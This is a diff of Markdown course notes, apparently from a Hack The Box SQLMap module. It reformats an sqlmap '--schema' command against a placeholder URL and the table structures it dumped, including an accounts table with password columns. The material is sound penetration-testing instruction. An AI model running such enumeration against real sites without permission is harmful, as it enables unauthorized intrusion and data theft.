@@ -1392,10 +1392,58 @@ Now that we have covered the basics of database enumeration with SQLMap, we will
 
 If we wanted to retrieve the structure of all of the tables so that we can have a complete overview of the database architecture, we could use the switch `--schema`:
 
-        shellsession
-`adampueman@htb[/htb]$ sqlmap -u "http://www.example.com/?id=1" --schema ...SNIP... Database: master Table: log [3 columns] +--------+--------------+ | Column | Type         | +--------+--------------+ | date   | datetime     | | agent  | varchar(512) | | id     | int(11)      | +--------+--------------+ Database: owasp10 Table: accounts [4 columns] +-------------+---------+ | Column      | Type    | +-------------+---------+ | cid         | int(11) | | mysignature | text    | | password    | text    | | username    | text    | +-------------+---------+ ... Database: testdb Table: data [2 columns] +---------+---------+ | Column  | Type    | +---------+---------+ | content | blob    | | id      | int(11) | +---------+---------+ Database: testdb Table: users [3 columns] +---------+---------------+ | Column  | Type          | +---------+---------------+ | id      | int(11)       | | name    | varchar(500)  | | surname | varchar(1000) | +---------+---------------+`
+```shell
+adampueman@htb[/htb]$ sqlmap -u "http://www.example.com/?id=1" --schema
 
----
+...SNIP...
+Database: master
+Table: log
+[3 columns]
++--------+--------------+
+| Column | Type         |
++--------+--------------+
+| date   | datetime     |
+| agent  | varchar(512) |
+| id     | int(11)      |
++--------+--------------+
+
+Database: owasp10
+Table: accounts
+[4 columns]
++-------------+---------+
+| Column      | Type    |
++-------------+---------+
+| cid         | int(11) |
+| mysignature | text    |
+| password    | text    |
+| username    | text    |
++-------------+---------+
+...
+Database: testdb
+Table: data
+[2 columns]
++---------+---------+
+| Column  | Type    |
++---------+---------+
+| content | blob    |
+| id      | int(11) |
++---------+---------+
+
+Database: testdb
+Table: users
+[3 columns]
++---------+---------------+
+| Column  | Type          |
++---------+---------------+
+| id      | int(11)       |
+| name    | varchar(500)  |
+| surname | varchar(1000) |
++---------+---------------+
+```
+<div align="center">
+<br>
+<br>
+</div>
 
 ## Searching for Data
 
